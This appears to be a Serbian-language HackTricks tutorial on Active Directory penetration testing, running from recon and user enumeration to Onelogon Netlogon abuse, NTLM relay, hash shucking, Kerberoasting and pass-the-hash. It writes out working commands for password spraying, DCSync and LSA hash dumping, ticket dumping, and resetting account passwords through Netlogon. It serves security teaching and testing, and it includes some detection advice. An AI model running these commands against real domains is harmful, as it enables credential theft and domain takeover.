# Metodologija za Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Osnovni pregled

**Active Directory** predstavlja osnovnu tehnologiju koja **mrežnim administratorima** omogućava efikasno kreiranje i upravljanje **domenima**, **korisnicima** i **objektima** unutar mreže. Projektovan je tako da podrži skaliranje, olakšavajući organizovanje velikog broja korisnika u upravljive **grupe** i **podgrupe**, uz kontrolu **prava pristupa** na različitim nivoima.

Struktura sistema **Active Directory** sastoji se od tri osnovna sloja: **domena**, **stabala** i **šuma**. **Domen** obuhvata kolekciju objekata, kao što su **korisnici** ili **uređaji**, koji dele zajedničku bazu podataka. **Stabla** predstavljaju grupe ovih domena povezanih zajedničkom strukturom, dok **šuma** predstavlja kolekciju više stabala povezanih putem **odnosa poverenja**, čineći najviši sloj organizacione strukture. Na svakom od ovih nivoa mogu se definisati posebna **prava pristupa** i **komunikacije**.

Ključni koncepti unutar sistema **Active Directory** uključuju:

1. **Directory** – Sadrži sve informacije koje se odnose na objekte sistema Active Directory.
2. **Object** – Označava entitete unutar direktorijuma, uključujući **korisnike**, **grupe** ili **deljene fascikle**.
3. **Domain** – Služi kao kontejner za objekte direktorijuma, pri čemu više domena može postojati unutar jednog **šuma**, a svaki domen održava sopstvenu kolekciju objekata.
4. **Tree** – Grupa domena koji dele zajednički korenski domen.
5. **Forest** – Najviši nivo organizacione strukture u sistemu Active Directory, sastavljen od više stabala sa međusobnim **odnosima poverenja**.

**Active Directory Domain Services (AD DS)** obuhvata niz servisa od ključnog značaja za centralizovano upravljanje i komunikaciju unutar mreže. Ovi servisi obuhvataju:

1. **Domain Services** – Centralizuje skladištenje podataka i upravlja interakcijama između **korisnika** i **domena**, uključujući funkcije **autentifikacije** i **pretrage**.
2. **Certificate Services** – Upravlja kreiranjem, distribucijom i upravljanjem bezbednim **digitalnim sertifikatima**.
3. **Lightweight Directory Services** – Podržava aplikacije zasnovane na direktorijumu putem **LDAP protokola**.
4. **Directory Federation Services** – Obezbeđuje mogućnosti **single sign-on** za autentifikaciju korisnika kroz više web aplikacija u okviru jedne sesije.
5. **Rights Management** – Pomaže u zaštiti materijala zaštićenog autorskim pravima regulisanjem njegove neovlašćene distribucije i upotrebe.
6. **DNS Service** – Od ključnog je značaja za razrešavanje **naziva domena**.

Za detaljnije objašnjenje pogledajte: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos autentifikacija**

Da biste naučili kako da **napadnete AD**, potrebno je da veoma dobro **razumete** proces **Kerberos autentifikacije**.\
[**Pročitajte ovu stranicu ako još uvek ne znate kako funkcioniše.**](kerberos-authentication.md)

## Cheat Sheet

Na stranici [https://wadcoms.github.io/](https://wadcoms.github.io) možete brzo videti koje komande možete pokrenuti za enumeraciju/exploit sistema AD.

> [!WARNING]
> Kerberos komunikacija obično **zahteva potpuno kvalifikovano ime domena (FQDN)** kako bi klijent mogao da dobije tiket za odgovarajući SPN. Pristupanje računaru putem IP adrese najčešće se prebacuje na NTLM umesto na Kerberos.

## Recon sistema Active Directory (bez creds/sesija)

Ako imate samo pristup AD okruženju, ali nemate kredencijale/sesije, možete:

- **Pentestovati mrežu:**
- Skenirati mrežu, pronaći računare i otvorene portove i pokušati da **iskoristite ranjivosti** ili **izvučete kredencijale** iz njih (na primer, [štampači mogu biti veoma zanimljive mete](ad-information-in-printers.md)).
- Enumeracija DNS-a može pružiti informacije o ključnim serverima u domenu, kao što su web serveri, štampači, share-ovi, VPN, mediji itd.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Pogledajte opštu [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) da biste pronašli više informacija o tome kako ovo uraditi.
- **Proveriti null i Guest pristup SMB servisima** (ovo neće funkcionisati na modernim verzijama Windows-a):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Detaljniji vodič za enumeraciju SMB servera možete pronaći ovde:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerirati Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Detaljniji vodič za enumeraciju LDAP-a možete pronaći ovde (obratite **posebnu pažnju na anonymous pristup**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Otrovati mrežu**
- Prikupiti kredencijale [**oponašanjem servisa pomoću Responder-a**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Pristupiti hostu [**zloupotrebom relay attack-a**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Prikupiti kredencijale **izlaganjem** [**lažnih UPnP servisa pomoću evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Izdvojiti korisnička imena/imena iz internih dokumenata, društvenih mreža i servisa (uglavnom web) unutar domenskih okruženja, kao i iz javno dostupnih izvora.
- Ako pronađete puna imena zaposlenih u kompaniji, možete pokušati različite AD **konvencije za korisnička imena (**[**pročitajte ovo**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Najčešće konvencije su: _NameSurname_, _Name.Surname_, _NamSur_ (3 slova od svakog imena), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _nasumična slova i 3 nasumična broja_ (abc123).
- Alati:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeracija korisnika

- **Anonymous SMB/LDAP enum:** Pogledajte stranice [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) i [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Kada se zatraži **nevažeće korisničko ime**, server će odgovoriti pomoću **Kerberos error** koda _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, što nam omogućava da utvrdimo da je korisničko ime nevažeće. **Važeća korisnička imena** će izazvati ili odgovor **TGT u AS-REP** formatu ili grešku _KRB5KDC_ERR_PREAUTH_REQUIRED_, koja ukazuje na to da korisnik mora da izvrši pre-autentifikaciju.
- **No Authentication against MS-NRPC**: Korišćenje auth-level = 1 (No authentication) protiv MS-NRPC (Netlogon) interfejsa na kontrolerima domena. Metod poziva funkciju `DsrGetDcNameEx2` nakon povezivanja sa MS-NRPC interfejsom kako bi proverio da li korisnik ili računar postoje bez ikakvih kredencijala. Alat [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementira ovu vrstu enumeracije. Istraživanje je dostupno [ovde](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>.
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Ako ste pronašli jedan od ovih servera u mreži, možete izvršiti i **enumeraciju korisnika nad njim**. Na primer, možete koristiti alat [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Liste korisničkih imena možete pronaći u [**ovom github repozitorijumu**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) i u ovom ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Međutim, trebalo bi da imate **imena ljudi koji rade u kompaniji** iz recon koraka koji je trebalo da obavite pre ovoga. Na osnovu imena i prezimena mogli biste da koristite skriptu [**namemash.py**](https://gist.github.com/superkojiman/11076951) za generisanje potencijalno važećih korisničkih imena.

### Zloupotreba allow-list-e ranjivog Netlogon kanala (Onelogon)

Čak i nakon što je **Zerologon** zakrpljen na DC-u, eksplicitno allow-listovani nalozi i dalje mogu biti izloženi **legacy/ranjivom ponašanju Netlogon secure-channel-a**. Rizična konfiguracija je GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** ili odgovarajuća vrednost u registru **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Ta vrednost je **SDDL security descriptor** (pogledajte [Security Descriptors](security-descriptors.md)). Bilo koji nalog ili grupa kojima je dodeljen odgovarajući ACE u DACL-u mogu biti meta. Na primer, `O:BAG:BAD:(A;;RC;;;WD)` praktično stavlja **Everyone** na allow-list-u.

Praktičan workflow operatera:

1. **Identifikujte allow-listovane principale** proverom i **SYSVOL/GPO** i **live DC registra**.
2. **Razrešite SID-ove** pronađene u SDDL-u u stvarne AD korisnike/računare i dajte prioritet **DC machine account-ima**, **trust account-ima** i drugim privilegovanim mašinama.
3. Više puta pokušajte **MS-NRPC / Netlogon authentication** kao allow-listovani nalog.
4. Nakon uspešnog pogađanja, zloupotrebite **Netlogon password-setting** da resetujete lozinku ciljnog naloga (javni PoC je postavlja na prazan string).<sup>[[9]](#references)[[10]](#references)</sup>

Primeri za brzu trijažu / lab iz javnog artefakta:
```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
--comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```
Napomene:

- **scanner** je koristan zato što efektivna allow-lista može postojati u **SYSVOL**-u, registru ili na oba mesta.
- Sama exploit putanja je važna zato što **ne zahteva Domain Admin privilegije** nakon identifikovanja ranjivog naloga.
- Kompromitovanje **Domain Controller machine account** naloga, kao što je `DC$`, naročito je opasno jer resetovanje te lozinke može direktno omogućiti šire putanje za **AD takeover**.
- Izvodljivost **brute-force** napada zavisi od režima: javno dostupan artifact opisuje meet-in-the-middle pristup, **24-bit** brute force kada je dostupan drugi computer account i sporije **32-bit** varijante.

Napomene o detekciji i hardeningu:

- Proverite allow-list policy i uklonite sve osim privremenih, izričito neophodnih izuzetaka zbog kompatibilnosti.
- Nadgledajte DC **System** događaje **5827/5828/5829/5830/5831** kako biste otkrili ranjive Netlogon konekcije koje su odbijene, pronađene ili izričito dozvoljene policy-jem.
- Naloge u `VulnerableChannelAllowList` tretirajte kao **high-risk** sve dok se legacy zavisnost ne ukloni.

### Poznavanje jednog ili više korisničkih imena

U redu, dakle već znate da imate važeće korisničko ime, ali nemate lozinke... Zatim pokušajte:

- [**ASREPRoast**](asreproast.md): Ako korisnik **nema** atribut _DONT_REQ_PREAUTH_, možete **zatražiti AS_REP poruku** za tog korisnika, koja će sadržati podatke šifrovane pomoću izvoda lozinke tog korisnika.
- [**Password Spraying**](password-spraying.md): Pokušajte sa najčešćim **lozinkama** za svakog otkrivenog korisnika; možda neki korisnik koristi lošu lozinku (imajte na umu password policy!).
- Imajte na umu da možete pokušati i **spray OWA servere** kako biste dobili pristup mail serverima korisnika.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Možda ćete moći da **dobijete** određene challenge **hash-eve** tako što ćete izvršiti **poisoning** nad nekim protokolima **mreže**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory enumeration pruža korisnička imena, email identifikatore i obrasce imenovanja, potencijalne hostove i servise koji mogu biti primorani da izvrše autentikaciju. Iskoristite taj kontekst da identifikujete izvodljive NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) i potencijalne putanje u AD okruženje.

### NetExec workspace-driven recon & relay posture checks

- Koristite **`nxcdb` workspaces** da biste čuvali stanje AD recon-a po engagement-u: `workspace create <name>` kreira SQLite DB-ove po protokolu u `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Prebacujte prikaze pomoću `proto smb|mssql|winrm`, a prikupljene secrets izlistajte pomoću `creds`. Ručno obrišite osetljive podatke kada završite: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Brzo otkrivanje subnet-a pomoću **`netexec smb <cidr>`** prikazuje **domain**, **OS build**, **SMB signing requirements** i **Null Auth**. Članovi koji prikazuju `(signing:False)` podložni su **relay** napadima, dok DC-ovi često zahtevaju signing.
- Generišite **hostnames u /etc/hosts** direktno iz NetExec izlaza kako biste olakšali targetiranje:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Kada je **SMB relay ka DC-u blokiran** zbog signing-a, ipak proverite stanje **LDAP-a**: `netexec ldap <dc>` ističe `(signing:None)` / slabo channel binding podešavanje. DC kod kojeg je SMB signing obavezan, ali je LDAP signing onemogućen, i dalje je moguća meta za **relay-to-LDAP** zloupotrebe kao što je **SPN-less RBCD**.

### Client-side printer credential leaks → masovna validacija domenских credentiala

- Printer/web UIs ponekad **ugrađuju maskirane administratorske lozinke u HTML**. Pregled izvornog koda/devtools-a može otkriti cleartext (npr. `<input value="<password>">`), čime se omogućava Basic-auth pristup repozitorijumima za skeniranje/štampanje.
- Preuzeti print jobs mogu sadržati **plaintext onboarding dokumente** sa lozinkama za pojedinačne korisnike. Prilikom testiranja održavajte parove usklađenim:<sup>[[6]](#references)</sup>
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steal NTLM Creds

Ako možete **pristupiti drugim računarima ili share-ovima** koristeći **null ili guest user**, mogli biste **postaviti fajlove** (kao što je SCF fajl) koji će, ako im se na neki način pristupi, **pokrenuti NTLM autentikaciju prema vama**, tako da možete **ukrasti** **NTLM challenge** i pokušati da ga crack-ujete:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** tretira svaki NT hash koji već posedujete kao kandidat za lozinku u drugim, sporijim formatima čiji se ključni materijal direktno izvodi iz NT hash-a. Umesto brute-force napada na duge passphrase-ove u Kerberos RC4 ticket-ima, NetNTLM challenge-ovima ili cached credentials, prosleđujete NT hash-ove Hashcat NT-candidate modovima i dozvoljavate mu da proveri ponovnu upotrebu lozinke, a da pritom nikada ne saznate plaintext. Ovo je naročito efikasno nakon kompromitovanja domena, kada možete prikupiti hiljade trenutnih i istorijskih NT hash-ova.<sup>[[5]](#references)</sup>

Koristite shucking kada:

- Imate NT corpus iz DCSync-a, SAM/SECURITY dump-ova ili credential vault-ova i treba da testirate ponovnu upotrebu u drugim domenima/forest-ovima.
- Uhvatite Kerberos materijal zasnovan na RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM response-ove ili DCC/DCC2 blob-ove.
- Želite brzo da dokažete ponovnu upotrebu dugih, necrackabilnih passphrase-ova i odmah izvršite pivot putem Pass-the-Hash.

Ova tehnika **ne funkcioniše** protiv encryption type-ova čiji ključevi nisu NT hash (npr. Kerberos etype 17/18 AES). Ako domen nameće samo AES, morate se vratiti na regularne password modove.

#### Building an NT hash corpus

- **DCSync/NTDS** – Koristite `secretsdump.py` sa history opcijom da preuzmete najveći mogući skup NT hash-ova (i njihove prethodne vrednosti):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History zapisi značajno proširuju skup kandidata jer Microsoft može da čuva do 24 prethodna hash-a po account-u. Za više načina za preuzimanje NTDS secrets pogledajte:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ili Mimikatz `lsadump::sam /patch`) izvlači lokalne SAM/SECURITY podatke i cached domain logons (DCC/DCC2). Uklonite duplikate i dodajte te hash-ove u isti `nt_candidates.txt` spisak.
- **Track metadata** – Čuvajte username/domain koji je proizveo svaki hash (čak i ako wordlist sadrži samo hex). Podudarni hash-ovi vam odmah govore koji principal ponovo koristi lozinku kada Hashcat prikaže uspešnog kandidata.
- Prednost dajte kandidatima iz istog forest-a ili trusted forest-a; time povećavate verovatnoću preklapanja tokom shucking-a.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Napomene:

- NT-candidate input-i **moraju ostati sirovi NT hash-ovi od 32 hex karaktera**. Isključite rule engine-e (bez `-r`, bez hybrid modova) jer mangling kvari materijal kandidatskog ključa.
- Ovi modovi nisu inherentno brži, ali je NTLM keyspace (~30.000 MH/s na M3 Max-u) oko 100 puta brži od Kerberos RC4-a (~300 MH/s). Testiranje odabrane NT liste mnogo je jeftinije od istraživanja celog password space-a u sporom formatu.
- Uvek pokrenite **najnoviji Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) jer su modovi 31500/31600/35300/35400 nedavno dodati.<sup>[[7]](#references)</sup>
- Trenutno ne postoji NT mod za AS-REQ Pre-Auth, a AES etype-ovi (19600/19700) zahtevaju plaintext password jer se njihovi ključevi izvode putem PBKDF2 iz UTF-16LE password-a, a ne iz sirovih NT hash-ova.

#### Example – Kerberoast RC4 (mode 35300)

1. Uhvatite RC4 TGS za ciljni SPN koristeći user-a sa niskim privilegijama (pogledajte Kerberoast stranicu za detalje):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Izvršite shuck ticket-a koristeći NT listu:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat izvodi RC4 ključ iz svakog NT kandidata i proverava `$krb5tgs$23$...` blob. Podudaranje potvrđuje da service account koristi jedan od vaših postojećih NT hash-ova.

3. Odmah izvršite pivot putem PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Po potrebi možete kasnije povratiti plaintext koristeći `hashcat -m 1000 <matched_hash> wordlists/`.

#### Example – Cached credentials (mode 31600)

1. Dump-ujte cached logons sa kompromitovane workstation stanice:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Kopirajte DCC2 liniju za interesantnog domain user-a u `dcc2_highpriv.txt` i izvršite shuck:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Uspešno podudaranje daje NT hash koji je već poznat u vašoj listi, čime se dokazuje da cached user ponovo koristi lozinku. Koristite ga direktno za PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ili ga brute-force-ujte u brzom NTLM modu da biste povratili string.

Potpuno isti workflow važi za NetNTLM challenge-response-ove (`-m 27000/27100`) i DCC (`-m 31500`). Kada identifikujete podudaranje, možete pokrenuti relay, SMB/WMI/WinRM PtH ili ponovo crack-ovati NT hash pomoću maski/rules offline.



## Enumerating Active Directory WITH credentials/session

Za ovu fazu morate imati **kompromitovane credentials ili session validnog domain account-a.** Ako imate validne credentials ili shell kao domain user, **treba da zapamtite da su prethodno navedene opcije i dalje načini za kompromitovanje drugih user-a**.

Pre nego što započnete authenticated enumeration, upoznajte se sa **Kerberos double-hop problemom**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Kompromitovanje account-a predstavlja **veliki korak ka proceni domena**, jer omogućava authenticated **Active Directory enumeration**:

Kada je reč o [**ASREPRoast**](asreproast.md), sada možete pronaći svakog potencijalno ranjivog user-a, a kada je reč o [**Password Spraying**](password-spraying.md), možete dobiti **spisak svih username-ova** i pokušati password kompromitovanog account-a, prazne password-e i nove obećavajuće password-e.

- Možete koristiti [**CMD za osnovni recon**](../basic-cmd-for-pentesters.md#domain-info)
- Možete koristiti i [**powershell za recon**](../basic-powershell-for-pentesters/index.html), koji će biti stealthier
- Takođe možete [**koristiti powerview**](../basic-powershell-for-pentesters/powerview.md) za izvlačenje detaljnijih informacija
- Još jedan odličan tool za recon u active directory-ju je [**BloodHound**](bloodhound.md). On **nije naročito stealthy** (u zavisnosti od metoda collection-a koje koristite), ali **ako vam to nije važno**, svakako bi trebalo da ga isprobate. Pronađite gde user-i mogu da koriste RDP, pronađite putanje do drugih grupa itd.
- **Drugi automated AD enumeration tool-ovi su:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records AD-a**](ad-dns-records.md), jer mogu sadržati interesantne informacije.
- **Tool sa GUI-jem** koji možete koristiti za enumeration direktorijuma jeste **AdExplorer.exe** iz **SysInternal** Suite-a.
- LDAP database možete pretraživati i pomoću **ldapsearch** da biste pronašli credentials u poljima _userPassword_ i _unixUserPassword_, ili čak u polju _Description_. Pogledajte [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) za druge metode.
- Ako koristite **Linux**, domen možete enumerisati i pomoću [**pywerview**](https://github.com/the-useless-one/pywerview).
- Možete pokušati i sa automated tool-ovima kao što su:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Veoma je lako dobiti sve domain username-ove iz Windows-a (`net user /domain`, `Get-DomainUser` ili `wmic useraccount get name,sid`). Na Linux-u možete koristiti: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ili `enum4linux -a -u "user" -p "password" <DC IP>`

> Čak i ako ovaj Enumeration odeljak deluje kratko, ovo je najvažniji deo svega. Otvorite linkove (naročito one za cmd, powershell, powerview i BloodHound), naučite kako da enumerišete domen i vežbajte dok se ne budete osećali sigurno. Tokom assessment-a, ovo će biti ključni trenutak za pronalaženje puta do DA ili za donošenje odluke da se ništa ne može uraditi.

### Kerberoast

Kerberoasting podrazumeva pribavljanje **TGS ticket-a** koje koriste service-ovi povezani sa user account-ovima i crack-ovanje njihove enkripcije — koja se zasniva na user password-ima — **offline**.

Više informacija o ovome:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connection (RDP, SSH, FTP, Win-RM, etc.)

Kada pribavite neke credentials, možete proveriti da li imate pristup nekoj **mašini**. U tu svrhu možete koristiti **CrackMapExec** za pokušaj povezivanja na više servera sa različitim protokolima, u skladu sa port scan-ovima.

### Local Privilege Escalation

Ako ste kompromitovali credentials ili session regularnog domain user-a i možete pristupiti **bilo kojoj mašini u domenu**, potražite putanju za **lokalno podizanje privilegija i prikupljanje credentials**. Lokalne administrator privilegije mogu omogućiti da **dump-ujete hash-ove drugih user-a** iz memorije (LSASS) i lokalnog storage-a (SAM).

U ovoj knjizi postoji kompletna stranica o [**local privilege escalation u Windows-u**](../windows-local-privilege-escalation/index.html) i [**checklist-a**](../checklist-windows-privilege-escalation.md). Takođe, ne zaboravite da koristite [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Veoma je **malo verovatno** da ćete pronaći **ticket-e** u trenutnom user **session-u** koji vam daju **dozvolu za pristup** neočekivanim resursima, ali možete proveriti:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Sa domain credentials ili korisničkom sesijom, ponovo proverite NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack): authenticated enumeration i coercion tehnike mogu otkriti relay putanje koje nisu bile dostupne tokom neautentifikovanog izviđanja.

### Looks for Creds in Computer Shares | SMB Shares

Sada kada imate neke osnovne credentials, trebalo bi da proverite da li možete da **pronađete** neke **zanimljive fajlove koji se dele unutar AD-a**. To možete uraditi ručno, ali to je veoma dosadan repetitivan zadatak, naročito ako pronađete stotine dokumenata koje morate da proverite.

[**Pratite ovaj link da biste saznali koje alate možete koristiti.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Ako možete da **pristupite drugim računarima ili share-ovima**, možete da **postavite fajlove** (kao što je SCF fajl) koji će, ako im neko pristupi, **pokrenuti NTLM autentifikaciju prema vama**, tako da možete da **ukradete** **NTLM challenge** i crack-ujete ga:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Ova ranjivost je omogućavala svakom autentifikovanom korisniku da **kompromituje domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Eskalacija privilegija na Active Directory-ju SA privilegovanim credentials/session

**Za sledeće tehnike običan domain user nije dovoljan; potrebne su vam posebne privilegije/credentials za izvođenje ovih napada.**

### Hash extraction

Nadamo se da ste uspeli da **kompromitujete neki local admin** nalog koristeći [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), uključujući relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [lokalnu eskalaciju privilegija](../windows-local-privilege-escalation/index.html).\
Zatim je vreme da dump-ujete sve hash-eve iz memorije i lokalno.\
[**Pročitajte ovu stranicu o različitim načinima za dobijanje hash-eva.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Kada imate hash korisnika**, možete ga koristiti da ga **impersonate-ujete**.\
Potrebno je da koristite neki **alat** koji će **obaviti** **NTLM autentifikaciju koristeći** taj **hash**, **ili** možete kreirati novu **sessionlogon** sesiju i **ubaciti** taj **hash** u **LSASS**, tako da se, kada se izvrši bilo koja **NTLM autentifikacija**, koristi taj **hash**. Poslednju opciju koristi mimikatz.\
[**Pročitajte ovu stranicu za više informacija.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ovaj napad ima za cilj da **iskoristi korisnikov NTLM hash za zahtevanje Kerberos ticket-a**, kao alternativu uobičajenom Pass The Hash napadu preko NTLM protokola. Zbog toga ovo može biti naročito **korisno u mrežama u kojima je NTLM protokol onemogućen** i u kojima je kao autentifikacioni protokol dozvoljen samo **Kerberos**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Kod metode napada **Pass The Ticket (PTT)**, napadači **kradu korisnikov authentication ticket** umesto njegove lozinke ili hash vrednosti. Ovaj ukradeni ticket se zatim koristi za **impersonate-ovanje korisnika**, čime se dobija neovlašćen pristup resursima i servisima unutar mreže.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Ako imate **hash** ili **lozinku** nekog **lokalnog administrator**a, trebalo bi da pokušate da se pomoću nje **lokalno prijavite** na druge **računare**.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Imajte na umu da je ovo prilično **bučno** i da bi ga **LAPS** ublažio.

